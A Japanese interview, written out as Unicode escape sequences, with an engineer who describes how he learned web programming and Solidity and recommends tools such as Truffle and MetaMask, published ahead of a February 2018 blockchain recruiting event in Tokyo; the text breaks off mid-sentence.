2018\u3053\u3093\u306b\u3061\u306f\uff012018\u5e742\u670824\u65e5(\u571f)\u306b\u6ce8\u76ee\u306e\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u30fb\u4eee\u60f3\u901a\u8ca8\u4f01\u696d\u306e\u958b\u767a\u73fe\u5834\u3092\u77e5\u3063\u3066\u89e6\u308c\u308b\u4f1a\u3092\u5343\u4ee3\u7530\u533a\u306b\u3066\u958b\u50ac\u3057\u307e\u3059\uff01\u305d\u308c\u306b\u5148\u7acb\u3061\u3001\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u696d\u754c\u306b\u98db\u3073\u8fbc\u3093\u3060\u30a8\u30f3\u30b8\u30cb\u30a2\u306e\u4f34\u30eb\u30ab\u6c0f\u306b\u8a71\u3092\u805e\u304d\u307e\u3057\u305f\u3002\u8cbf\u6613\u4f1a\u793e\u3067\u50cd\u3044\u305f\u5f8c\u3001\u73fe\u5728\u306f\u30b9\u30de\u30fc\u30c8\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u306b\u306e\u3081\u308a\u8fbc\u3093\u3067\u3044\u308b\u3068\u3044\u3046\u30eb\u30ab\u3055\u3093\u3002\u6c17\u306b\u306a\u308a\u307e\u3059\u3002\u2015\u30d7\u30ed\u30b0\u30e9\u30df\u30f3\u30b0\u59cb\u3081\u305f\u306e\u306f\u3044\u3064\u3067\u3059\u304b\uff1f\u2015\u4f34\u30eb\u30ab\u6c0f\u4eca\u306f27\u6b73\u3067\u30d7\u30ed\u30b0\u30e9\u30df\u30f3\u30b0\u3092\u59cb\u3081\u305f\u306e\u306f15\u6b73\u306e\u9803\u3067\u3059\u3002\u5f53\u6642\u3001\u52c9\u5f37\u3067\u4f7f\u3063\u3066\u3044\u305f\u6697\u8a18\u3092\u3059\u308b\u305f\u3081\u306e\u30d5\u30e9\u30c3\u30b7\u30e5\u30ab\u30fc\u30c9\u306e\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u304c\u3042\u308a\u307e\u3057\u305f\u3002\u5358\u8a9e\u5e33\u306e\u3088\u3046\u306a\u3082\u306e\u3067\u3059\u3002\u305d\u306e\u30a2\u30d7\u30ea\u306f\u81ea\u5206\u3067\u8272\u3005\u306a\u30ab\u30fc\u30c9\u3092\u4f5c\u3063\u3066\u3001\u30ab\u30fc\u30c9\u306e\u51fa\u65b9\u3084\u898b\u305f\u76ee\u3092HTML\u3084CSS\u3067\u5909\u3048\u308b\u3053\u3068\u304c\u3067\u304d\u307e\u3057\u305f\u3002\u30a2\u30d7\u30ea\u5185\u3067\u3059\u304c\u3001\u305d\u3053\u3067HTML\u3068CSS\u3092\u5927\u4f53\u7406\u89e3\u3067\u304d\u308b\u3088\u3046\u306b\u306a\u308a\u307e\u3057\u305f\u3002\u305d\u306e\u5f8c\u3001\u8cbf\u6613\u306e\u4f1a\u793e\u3067\u50cd\u3044\u3066\u3044\u305f2015\u5e745\u6708\u9803\u3001\u65b0\u3057\u304fIT\u3092\u62c5\u5f53\u3059\u308b\u4eba\u304c\u5165\u793e\u3057\u3066\u304d\u307e\u3057\u305f\u3002\u5f7c\u304cPHP\u3084JavaScript\u304c\u3067\u304d\u308b\u4eba\u3060\u3063\u305f\u306e\u3067\u3001\u81ea\u5206\u306e\u5e2d\u3092\u7121\u7406\u3084\u308a\u5f7c\u306e\u5e2d\u306e\u96a3\u306b\u7f6e\u3044\u3066\u3001\u6bce\u65e5\u8272\u3005\u306a\u3053\u3068\u3092\u805e\u304d\u306a\u304c\u3089\u3001\u6539\u3081\u3066\u52c9\u5f37\u3057\u59cb\u3081\u307e\u3057\u305f\u3002\u81ea\u5206\u3067\u4f5c\u308a\u305f\u3044\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u3084\u30db\u30fc\u30e0\u30da\u30fc\u30b8\u304c\u982d\u306e\u4e2d\u306b\u3042\u3063\u305f\u306e\u3067\u3001\u3053\u308c\u3067\u3088\u3046\u3084\u304f\u4f5c\u308b\u305f\u3081\u306e\u30b9\u30ad\u30eb\u3092\u8eab\u306b\u3064\u3051\u3089\u308c\u308b\u3093\u3058\u3083\u306a\u3044\u304b\u3068\u601d\u3063\u3066\u9811\u5f35\u308a\u307e\u3057\u305f\u3002\u2015\u3069\u3046\u3044\u3046\u3082\u306e\u3092\u4f5c\u308a\u305f\u3044\u3068\u601d\u3063\u3066\u3044\u305f\u306e\u3067\u3059\u304b\uff1f\u2015\u4f34\u30eb\u30ab\u6c0f\u632f\u308a\u8fd4\u308b\u3068\u3061\u3087\u3063\u3068\u30c0\u30b5\u3044\u3093\u3067\u3059\u304c\u3001\u591a\u304f\u306e\u30d7\u30ed\u30b0\u30e9\u30de\u30fc\u304c\u6700\u521d\u306b\u53d6\u308a\u7d44\u3080\u30bf\u30b9\u30af\u7ba1\u7406\u306e\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u3067\u3059\u3002\u79c1\u3082\u30ea\u30b9\u30c8\u3084\u30bf\u30b9\u30af\u7ba1\u7406\u306e\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u304c\u5143\u3005\u3059\u3054\u304f\u597d\u304d\u3067\u3057\u305f\u3002\u4f8b\u3048\u3070\u3001\u5b66\u6821\u3067\u52c9\u5f37\u3059\u308b\u3053\u3068\u3088\u308a\u3082\u3001\u52c9\u5f37\u3059\u308b\u8a08\u753b\u3092\u7acb\u3066\u308b\u3053\u3068\u306b\u6642\u9593\u3092\u4f7f\u3063\u3066\u3044\u307e\u3057\u305f\u3002\u305d\u3046\u3044\u3046\u3053\u3068\u304c\u5927\u597d\u304d\u3067\u8272\u3005\u306a\u30ea\u30b9\u30c8\u3092\u4f5c\u3063\u305f\u308a\u3001\u3042\u308b\u3079\u304d\u59ff\u3092\u8003\u3048\u305f\u308a\u3001\u30bf\u30b9\u30af\u7ba1\u7406\u3092\u3057\u305f\u308a\u3002\u65e2\u5b58\u306e\u305d\u3046\u3044\u3046\u30a2\u30d7\u30ea\u3092\u5168\u90e8\u4f7f\u3063\u3066\u3001\u6bce\u56de\u4f55\u304b\u8db3\u308a\u306a\u3044\u306a\u3068\u601d\u3063\u3066\u3001\u6700\u7d42\u7684\u306b\u81ea\u5206\u3067\u4f5c\u308b\u3057\u304b\u306a\u3044\u3068\u601d\u3063\u3066\u4f5c\u308a\u307e\u3057\u305f\u3002\u2015JavaScript\u306b\u306f\u3069\u3053\u3067\u6163\u308c\u305f\u3093\u3067\u3059\u304b\uff1f\u2015\u4f34\u30eb\u30ab\u6c0f\u6700\u521d\u306fPHP\u306e\u65b9\u304c\u5f37\u304b\u3063\u305f\u3093\u3067\u3059\u3002\u305d\u306e\u7406\u7531\u306f\u3001\u4f1a\u793e\u306b\u5165\u3063\u3066\u304d\u305fIT\u62c5\u5f53\u306e\u4eba\u304cJavaScript\u3088\u308a\u3082PHP\u306e\u65b9\u304c\u5f37\u304b\u3063\u305f\u304b\u3089\u3067\u3059\u3002\u4e21\u65b9\u6559\u3048\u3066\u304f\u308c\u305f\u306e\u3067\u3059\u304c\u3001\u79c1\u306fPHP\u306e\u65b9\u304c\u5148\u306b\u3067\u304d\u308b\u3088\u3046\u306b\u306a\u308a\u307e\u3057\u305f\u3002JavaScript\u306f\u5f8c\u304b\u3089\u899a\u3048\u305f\u306e\u3067\u3059\u304c\u3001\u6700\u521d\u306f\u6b63\u76f4\u66f8\u304d\u306b\u304f\u3044\u306a\u3068\u601d\u3063\u3066\u3044\u307e\u3057\u305f\u3002PHP\u306fHTML\u306e\u4e2d\u3067\u3082\u66f8\u3051\u307e\u3059\u304c\u3001JavaScript\u306f\u5225\u67a0\u3068\u8003\u3048\u306a\u3051\u308c\u3070\u3044\u3051\u307e\u305b\u3093\u3002\u305d\u308c\u304c\u6700\u521d\u306f\u5c11\u3057\u5927\u5909\u3067\u3057\u305f\u3002Angular\u3001React\u3001Vue.js\u3068\u3044\u3046\uff13\u3064\u306e\u5927\u304d\u306a\u30d5\u30ec\u30fc\u30e0\u30ef\u30fc\u30af\u304c\u3042\u308a\u307e\u3059\u3002\u305d\u306e\u4e2d\u3067\u305f\u307e\u305f\u307e\u51fa\u4f1a\u3063\u305fVue.js\u304c\u3059\u3070\u3089\u3057\u904e\u304e\u3066\u604b\u306b\u843d\u3061\u307e\u3057\u305f\uff08\u7b11\uff09\u3002\u305d\u308c\u3067\u3069\u3093\u3069\u3093JavaScript\u304c\u597d\u304d\u306b\u306a\u3063\u3066\u3001\u9006\u306b\u30b5\u30fc\u30d0\u30fc\u5074\u306e\u8a00\u8a9e\u306f\u3042\u307e\u308a\u597d\u304d\u3067\u306f\u306a\u304f\u3066\u3001\u4eca\u306f\u5168\u90e8JavaScript\u3060\u3051\u3067UI\u3092\u4f5c\u308a\u305f\u3044\u3067\u3059\u3002\u306a\u305c\u304b\u3068\u8a00\u3046\u3068\u3001PHP\u306f\u4ed5\u4e8b\u3068\u3044\u3046\u611f\u3058\u304c\u3059\u308b\u304b\u3089\u3067\u3059\u3002\u4f5c\u3089\u306a\u3044\u3068\u3044\u3051\u306a\u3044\u69cb\u9020\u3001\u307f\u3093\u306a\u304c\u901a\u308b\u9053\u3002\u3067\u3082\u672c\u5f53\u306b\u30e6\u30fc\u30b6\u30fc\u304c\u89e6\u308c\u308bUI\u304c\u81ea\u5206\u306e\u4f5c\u308a\u305f\u3044\u3082\u306e\u306a\u306e\u3067\u3001\u305d\u308c\u306b100%\u96c6\u4e2d\u3067\u304d\u308b\u306e\u304c1\u756a\u697d\u3057\u3044\u3067\u3059\u3002\u305d\u308c\u304cJavaScript\u3067\u5168\u90e8\u3067\u304d\u308b\u306e\u3067\u3001\u5f97\u610f\u306b\u306a\u3063\u3066\u304d\u307e\u3057\u305f\u3002\u2015\u305d\u3046\u3084\u3063\u3066\u30b9\u30ad\u30eb\u3092\u8eab\u306b\u3064\u3051\u3066\u3044\u304f\u4e2d\u3067\u3001Solidity\u306b\u3064\u3044\u3066\u306f\u3069\u3046\u611f\u3058\u3066\u3044\u307e\u3059\u304b\uff1f\u2015\u4f34\u30eb\u30ab\u6c0fSolidity\u306f\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u306e\u305f\u3081\u306e\u8a00\u8a9e\u3067\u3059\u304c\u3001JavaScript\u306b\u975e\u5e38\u306b\u8fd1\u3044\u3067\u3059\u3002Solidity\u306f\u307e\u3060\u6570\u30ab\u6708\u3057\u304b\u3044\u3058\u3063\u3066\u3044\u306a\u3044\u306e\u3067\u3001\u5f97\u610f\u306a\u308f\u3051\u3067\u306f\u306a\u3044\u3067\u3059\u304cJavaScript\u306e\u30d9\u30fc\u30b9\u304c\u3042\u308b\u306e\u3067\u305d\u308c\u307b\u3069\u96e3\u3057\u304f\u306f\u306a\u3044\u3067\u3059\u3002\u30b3\u30f3\u30bb\u30d7\u30c8\u3084Solidity\u306e\u4e2d\u3067\u4f7f\u3048\u308bvariable\u306e\u7a2e\u985e\u306a\u3069\u304c\u3042\u308b\u7a0b\u5ea6\u4f3c\u3066\u3044\u307e\u3059\u3002\u2015\u96e3\u3057\u3044\u90e8\u5206\u3082\u3042\u308a\u307e\u3059\u304b\uff1fSolidity\u3001\u3064\u307e\u308a\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u306e\u96e3\u3057\u3044\u3068\u3053\u308d\u306f1\u56de\u516c\u958b\u3057\u3066\u3057\u307e\u3046\u3068\u623b\u305b\u306a\u3044\u3053\u3068\u3067\u3059\u3002WEB\u30a2\u30d7\u30ea\u306e\u5834\u5408\u306f\u3001\u4f5c\u3063\u3066\u51fa\u3057\u3066\u3001\u30d0\u30b0\u304c\u51fa\u305f\u3089\u4fee\u6b63\u3059\u308c\u3070\u3044\u3044\u306e\u3067\u7c21\u5358\u3067\u3059\u3002\u3057\u304b\u3057\u3001\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u306f\uff11\u56de\u51fa\u3057\u3066\u3057\u307e\u3046\u3068\u3001\u305d\u3053\u3067\u30d0\u30b0\u304c\u3042\u3063\u305f\u3089\u5927\u5909\u306a\u3053\u3068\u306b\u306a\u3063\u3066\u3057\u307e\u3046\u306e\u304c\u96e3\u3057\u3044\u3068\u3053\u308d\u3067\u3059\u306d\u3002\u2015\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u306f\u4eca\u5f8c\u3001\u793e\u4f1a\u306b\u3069\u3046\u3044\u3046\u30a4\u30f3\u30d1\u30af\u30c8\u3092\u4e0e\u3048\u3066\u3044\u304f\u3068\u601d\u3044\u307e\u3059\u304b\uff1f\u2015\u4f34\u30eb\u30ab\u6c0f\u96e3\u3057\u3044\u8cea\u554f\u3067\u3059\u306d\uff08\u7b11\uff09\u3002\u3053\u306e\u8cea\u554f\u3060\u3051\u3067\u3082\uff13\u6642\u9593\u306f\u8a71\u305b\u308b\u3088\u3046\u306a\u6c17\u304c\u3057\u307e\u3059\u3002\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u306e\u30a4\u30f3\u30d1\u30af\u30c8\u306f\u3001\u4f8b\u3048\u3070\u91d1\u878d\u6a5f\u95a2\u3092\u901a\u3055\u305a\u306b\u8cc7\u91d1\u8abf\u9054\u3067\u304d\u308b\u3053\u3068\u3001\u8ab0\u304b\u3092\u4fe1\u7528\u3059\u308b\u3053\u3068\u306a\u3057\u306b\u5b89\u5168\u306b\u9001\u91d1\u3067\u304d\u308b\u3053\u3068\u3002\u3082\u3063\u3068\u3059\u3054\u3044\u3053\u3068\u3082\u3067\u304d\u308b\u3068\u601d\u3044\u307e\u3059\u304c\u3001\u305d\u3046\u3044\u3046\u6839\u672c\u7684\u306a\u3068\u3053\u308d\u304c\uff11\u756a\u5f71\u97ff\u3092\u4e0e\u3048\u308b\u3068\u601d\u3044\u307e\u3059\u3002\u65e5\u672c\u4eba\u306f\u3042\u307e\u308a\u4f7f\u308f\u306a\u3044\u3067\u3059\u304c\u3001\u5143\u3005\u8ca7\u3057\u3044\u56fd\u3067\u3001\u6d77\u5916\u3067\u50cd\u304f\u3088\u3046\u306b\u306a\u3063\u3066\u672c\u56fd\u306e\u81ea\u5206\u306e\u5bb6\u65cf\u306b\u6bce\u6708\u9001\u91d1\u3059\u308b\u6642\u306b\u30a6\u30a8\u30b9\u30bf\u30f3\u30e6\u30cb\u30aa\u30f3\u3057\u304b\u306a\u3044\u3093\u3067\u3059\u306d\u3002\u305d\u3046\u3044\u3046\u4eba\u305f\u3061\u304c\u3059\u3054\u304f\u591a\u3044\u3067\u3059\u3002\u305d\u3053\u3067\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u306e\u6280\u8853\u3092\u4f7f\u3063\u3066\u9060\u3044\u56fd\u306e\u5bb6\u65cf\u306b\u7c21\u5358\u306b\u9001\u91d1\u3067\u304d\u308b\u3088\u3046\u306b\u306a\u308b\u3053\u3068\u306f\u3059\u3070\u3089\u3057\u3044\u3068\u601d\u3044\u307e\u3059\u3002\u2015Solidity\u3092\u5b66\u3076\u3053\u3068\u3092\u4ed6\u306e\u30a8\u30f3\u30b8\u30cb\u30a2\u306b\u3082\u52e7\u3081\u305f\u3044\u3067\u3059\u304b\uff1f\u2015\u4f34\u30eb\u30ab\u6c0f\u3059\u3054\u304f\u601d\u3044\u307e\u3059\u3002\u307e\u305a\u306f\u3084\u3063\u3066\u307f\u306a\u3044\u3068\u5206\u304b\u3089\u306a\u3044\u306e\u3067\u3002JavaScript\u304c\u3067\u304d\u308b\u4eba\u305f\u3061\u304c\u591a\u3044\u306e\u3067\u3001\u305b\u3063\u304b\u304f\u306a\u306e\u3067Solidity\u3092\u66f8\u3044\u3066\u307f\u305f\u3089\u3068\u3059\u3054\u304f\u8a00\u3044\u305f\u3044\u3067\u3059\u3002\u96e3\u3057\u3044\u3068\u3044\u3046\u30a4\u30e1\u30fc\u30b8\u304c\u3042\u308a\u307e\u3059\u304c\u3001\u5b9f\u969b\u306b\u3084\u3063\u3066\u307f\u308b\u3068\u697d\u5668\u3092\u3072\u304f\u306e\u3068\u5168\u304f\u540c\u3058\u3067\u3001\u7df4\u7fd2\u3092\u3059\u308c\u3070\u3067\u304d\u308b\u3088\u3046\u306b\u306a\u308a\u307e\u3059\u3002JavaScript\u304c\u3042\u308b\u7a0b\u5ea6\u5206\u304b\u308b\u65b9\u306f\u3001Solidity\u306b\u305c\u3072\u89e6\u308c\u3066\u307b\u3057\u3044\u3067\u3059\u3002\u307f\u3093\u306a\u306b\u304a\u52e7\u3081\u3057\u305f\u3044\u3067\u3059\u3002\u2015Solidity\u306f\u6700\u521d\u3001\u3069\u3046\u3084\u3063\u3066\u52c9\u5f37\u3057\u305f\u3093\u3067\u3059\u304b\uff1f\u2015\u4f34\u30eb\u30ab\u6c0f\u52d5\u753b\u5f62\u5f0f\u3067\u5b66\u3076\u3053\u3068\u304c\u591a\u3044\u3067\u3059\u3002\u52d5\u753b\u5f62\u5f0f\u306e\u30ac\u30a4\u30c9\u3001\u30c1\u30e5\u30fc\u30c8\u30ea\u30a2\u30eb\u3092\u63a2\u3057\u305f\u308a\u3057\u307e\u3059\u3002\u5b66\u3093\u3067\u3044\u308b\u3046\u3061\u306b\u5148\u751f\u304c\u3084\u3063\u3066\u3044\u308b\u3053\u3068\u3092\u30de\u30cd\u3057\u3066\u5b66\u3076\u3053\u3068\u304c\u52b9\u679c\u7684\u3060\u3068\u5206\u304b\u308a\u307e\u3057\u305f\u3002\u305f\u3060\u3001Solidity\u306e\u52d5\u753b\u306e\u30c1\u30e5\u30fc\u30c8\u30ea\u30a2\u30eb\u306f\u307e\u3060\u3042\u307e\u308a\u306a\u3044\u3067\u3059\u306d\u3002\u79c1\u304c\u4f7f\u3063\u305f\u306e\u306fUdemy\u3067\u3059\u3002\u65e5\u672c\u8a9e\u306e\u52d5\u753b\u3082\u3044\u304f\u3064\u304b\u3042\u308a\u307e\u3057\u305f\u304c\u3001\u82f1\u8a9e\u306e\u30ac\u30a4\u30c9\u3092\u4f7f\u3063\u3066\u3001\u30bc\u30ed\u304b\u3089\u4e00\u7dd2\u306bSolidity\u3001\u30b9\u30de\u30fc\u30c8\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u3092\u4f7f\u3063\u305f\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u3092\u4f5c\u308a\u307e\u3057\u3087\u3046\u3068\u3044\u3046\u306e\u3092\u3084\u3063\u3066\u3001\u975e\u5e38\u306b\u52c9\u5f37\u306b\u306a\u308a\u307e\u3057\u305f\u3002\u2015\u4eca\u304b\u3089\u3067\u3082\u9045\u304f\u306f\u306a\u3044\u3067\u3059\u304b\uff1f\u2015\u4f34\u30eb\u30ab\u6c0fSolidity\u3092\u59cb\u3081\u308b\u306b\u306f\u3061\u3087\u3046\u3069\u3044\u3044\u6642\u671f\u3060\u3068\u601d\u3063\u3066\u3044\u307e\u3059\u3002\u7406\u7531\u306f\u3001\u4fbf\u5229\u306a\u30c4\u30fc\u30eb\u304c\u3069\u3093\u3069\u3093\u51fa\u3066\u304d\u3066\u3044\u308b\u304b\u3089\u3067\u3059\u3002\u52c9\u5f37\u306e\u305f\u3081\u306e\u3082\u306e\u3084\u5b9f\u969b\u306b\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u3092\u4f5c\u308b\u305f\u3081\u306e\u30c4\u30fc\u30eb\u304c\u3042\u308a\u307e\u3059\u3002\u4f8b\u3092\u6319\u3052\u308b\u3068\u3001\u30b9\u30de\u30fc\u30c8\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u3092\u66f8\u3044\u3066\u3001\u8a66\u3057\u305f\u3044\u3068\u3057\u305f\u3089\u3001\u8a66\u305b\u308b\u305f\u3081\u306e\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u304c\u5fc5\u8981\u3067\u3059\u3002JavaScript\u3060\u3063\u305f\u3089\u3001\u30d6\u30e9\u30a6\u30b6\u30fc\u3067\u958b\u3044\u3066\u3001\u305d\u306e\u307e\u3093\u307e\u8a66\u305b\u307e\u3059\u304c\u3001\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u306f\u9055\u3044\u307e\u3059\u3002\u30b9\u30de\u30fc\u30c8\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u3092\u8a66\u3059\u305f\u3081\u3001\u30ed\u30fc\u30ab\u30eb\u306a\u74b0\u5883\u3067\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u306e\u30b7\u30df\u30e5\u30ec\u30fc\u30b7\u30e7\u30f3\u3092\u4f5c\u3089\u306a\u3044\u3068\u3044\u3051\u306a\u3044\u3067\u3059\u3002\u305d\u3053\u304b\u3089\u3082\u3046\uff11\u3064\u3042\u308b\u9ad8\u3044\u30cf\u30fc\u30c9\u30eb\u306f\u3001\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u3092\u4f5c\u308c\u305f\u3068\u3057\u3066\u3082\u3001\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u306b\u30a2\u30c3\u30d7\u30ed\u30fc\u30c9\u3059\u308b\u65b9\u6cd5\u306f\u3059\u3054\u304f\u5927\u5909\u3067\u3059\u3002\u5358\u7d14\u306b\u8a00\u3046\u3068\u3001\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u3092\u30b3\u30f3\u30d1\u30a4\u30eb\u3057\u3066\u8272\u3005\u306a\u30b3\u30de\u30f3\u30c9\u3067\u305d\u308c\u3092\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u306b\u30c8\u30e9\u30f3\u30b6\u30af\u30b7\u30e7\u30f3\u3068\u3057\u3066\u30a2\u30c3\u30d7\u30ed\u30fc\u30c9\u3059\u308b\u3068\u3044\u3046\u30a4\u30e1\u30fc\u30b8\u3067\u3059\u3002\u305d\u308c\u3060\u3051\u3067\u3082\u30b3\u30de\u30f3\u30c9\u30e9\u30a4\u30f3\u304b\u3089\u3059\u308b\u3068\u300110\u884c\u3050\u3089\u3044\u30b3\u30de\u30f3\u30c9\u3092\u66f8\u304b\u306a\u3044\u3068\u3044\u3051\u306a\u304f\u3066\u30011\u3064\u3067\u3082\u9593\u9055\u3048\u305f\u3089\u5927\u5909\u306a\u3053\u3068\u306b\u306a\u308a\u307e\u3059\u3002\u305d\u308c\u3092\u30ed\u30fc\u30ab\u30eb\u306a\u74b0\u5883\u3067\u30b7\u30df\u30e5\u30ec\u30fc\u30b7\u30e7\u30f3\u3057\u305f\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u3060\u3063\u305f\u308a\u3001\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u3092\u30b3\u30f3\u30d1\u30a4\u30eb\u3057\u3066\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u306b\u30a2\u30c3\u30d7\u30ed\u30fc\u30c9\u3057\u3066\u304f\u308c\u308b\u3053\u3068\u3060\u3063\u305f\u308a\u3001\u6700\u8fd1\u305d\u3046\u3044\u3046\u3053\u3068\u306e\u305f\u3081\u306b\u4fbf\u5229\u306a\u30c4\u30fc\u30eb\u304c\u51fa\u3066\u304d\u3066\u3044\u307e\u3059\u3002\u30a2\u30e1\u30ea\u30ab\u306e\u4f1a\u793e\u304c\u4f5c\u3063\u305f\u300cTruffle\u300d\u3068\u3044\u3046\u30c4\u30fc\u30eb\u304c\u3042\u3063\u3066\u3001\u30ed\u30fc\u30ab\u30eb\u306e\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u306e\u30b7\u30df\u30e5\u30ec\u30fc\u30b7\u30e7\u30f3\u3068\u30b3\u30f3\u30d1\u30a4\u30eb\u3092\u7c21\u5358\u306b\u3057\u3066\u304f\u308c\u308b\u30b3\u30de\u30f3\u30c9\u306a\u3069\u3092\u5168\u90e8\u63d0\u4f9b\u3057\u3066\u304f\u308c\u3066\u3044\u307e\u3059\u3002\uff11\u884c\u3067\u5b9f\u884c\u3067\u304d\u307e\u3059\u3002\u2015\u4fbf\u5229\u306a\u3082\u306e\u304c\u51fa\u3066\u304d\u3066\u3044\u308b\u3093\u3067\u3059\u306d\u3002\u2015\u4f34\u30eb\u30ab\u6c0f\u30d6\u30e9\u30a6\u30b6\u4e0a\u3067\u3001\u81ea\u5206\u304c\u4f5c\u3063\u305f\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u306e\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u306bUI\u3092\u3064\u3051\u305f\u3044\u3068\u3057\u307e\u3059\u3002\u30b9\u30de\u30fc\u30c8\u30b3\u30f3\u30c8\u30e9\u30af\u30c8\u3092\u30b3\u30de\u30f3\u30c9\u3060\u3051\u3067\u3082\u4f7f\u3048\u308b\u306e\u3067\u3059\u304c\u3001\u304b\u308f\u3044\u3044UI\u3092\u4ed8\u3051\u308b\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u3082\u6700\u8fd1\u4e00\u676f\u51fa\u3066\u304d\u3066\u3044\u307e\u3059\u3002\uff11\u3064\u306e\u4f8b\u306fCryptoKitties\u3067\u3059\u3002\u305d\u306eUI\u304c\u306a\u3044\u3068\u3001\u591a\u5206\u30a2\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\u3068\u3057\u3066\u6210\u308a\u7acb\u305f\u306a\u3044\u3068\u601d\u3044\u307e\u3059\u3002\u4f46\u3057\u3001\u30d6\u30e9\u30a6\u30b6\u30fc\u306e\u5834\u5408\u3001\u4f55\u304c\u5fc5\u8981\u304b\u3068\u8a00\u3046\u3068\u3001\u30d6\u30e9\u30a6\u30b6\u304c\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u3068\u306e\u30b3\u30df\u30e5\u30cb\u30b1\u30fc\u30b7\u30e7\u30f3\u3092\u53d6\u308b\u5fc5\u8981\u304c\u3042\u308a\u307e\u3059\u3002\u305d\u306e\u305f\u3081\u306eMetaMask\u3068\u3044\u3046\u4fbf\u5229\u306a\u30c4\u30fc\u30eb\u304c\u3042\u308a\u307e\u3059\u3002\u30d6\u30e9\u30a6\u30b6\u306e\u30a8\u30af\u30b9\u30c6\u30f3\u30b7\u30e7\u30f3\u304c\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u4e0a\u306e\u30b3\u30df\u30e5\u30cb\u30b1\u30fc\u30b7\u30e7\u30f3\u3092\u5168\u90e8\u3084\u3063\u3066\u304f\u308c\u308b\u3068\u3044\u3046\u30a4\u30e1\u30fc\u30b8\u3067\u3059\u3002\u2015\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u306b\u95a2\u3059\u308b\u4fbf\u5229\u306a\u30c4\u30fc\u30eb\u304c\u3069\u3093\u3069\u3093\u51fa\u3066\u304d\u3066\u3044\u308b\u306e\u3067\u3001\u3053\u308c\u304b\u3089\u52c9\u5f37\u3059\u308b\u4eba\u306b\u306f\u30c1\u30e3\u30f3\u30b9\u3067\u3059\u306d\u3002\u2015\u4f34\u30eb\u30ab\u6c0f\u59cb\u3081\u308b\u306e\u306b\u4eca\u306f\u3044\u3044\u6642\u671f\u3060\u3068\u601d\u3044\u307e\u3059\u3002\u2015\u65e5\u672c\u521d\u306e\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u696d\u754c\u306e\u30a8\u30f3\u30b8\u30cb\u30a2\u306b\u7279\u5316\u3057\u305f\u5408\u540c\u8aac\u660e\u4f1a\u304c2\u670824\u65e5\u306b\u3042\u308a\u307e\u3059\u3002\u2015\u4f34\u30eb\u30ab\u6c0f\u3044\u3044\u3067\u3059\u306d\u3002\u4eca\u307e\u3067\u8272\u3005\u306a\u30d6\u30ed\u30c3\u30af\u30c1\u30a7\u30fc\u30f3\u306e\u30a4\u30d9\u30f3\u30c8\u306b\u884c\u304d\u307e\u3057\u305f\u304c\u3001\u8272\u3005\u306a\u30b0\u30eb\u30fc\u30d7\u3084\u4f1a\u793e\u304c\u8a71\u306b\u6765\u3066\u3044\u3066\u3001\u7d50\u5c40\u3088\u304f\u5206\u304b\u3089\u306a\u3044\u3053\u3068\u3082\u591a\u304b\u3063\u305f\u3067\u3059\u3002\u5b9f\u969b\u306b\u30d7\u30ed\u30b0\u30e9\u30df\u30f3\u30b0\u306b\u89e6\u308c\u308c\u3070\u305d\u3053\u304b\u3089\u8272\u3005\u306a\u9053\u304c\u958b\u3051\u308b\u3068\u601d\u3044\u307e\u3059\u3002\u5b9f\u969b\u306b\u30d7\u30ed\u30b0\u30e9\u30df\u30f3\u30b0\u306b\u89e6\u308c\u308b\u3088\u3046\u306a\u30a4\u30d9\u30f3\u30c8\u3001\u30d7\u30ed\u30b0\u30e9\u30df\u30f3\u30b0\u3092\u91cd\u8996\u3059\u308b\u3088\u3046\u306a\u30a4\u30d9\u30f3\u30c8\u304c\u5927\u4e8b\u3060\u3068\u601d\u3044\u307e\u3059\u3002\u30a8\u30f3\u30b8\u30cb\u30a2\u3068\u3057\u3066\u306f\u3001\u3044\u304f\u3064\u304b\u306e\u7c21\u5358\u306a\u5165\u9580\u7684\u306a\u8aac\u660e\u304c\u3042\u308b\u3068\u3046\u308c\u3057\u3044\u3067\u3059\u306d\u3002\u4f8b\u3048\u3070\u79c1\u304c\u8aac\u660e\u3057\u305f\u3088\u3046\u306a\u30c4\u30fc\u30eb\u3092\u5b9f\u969b\u306b\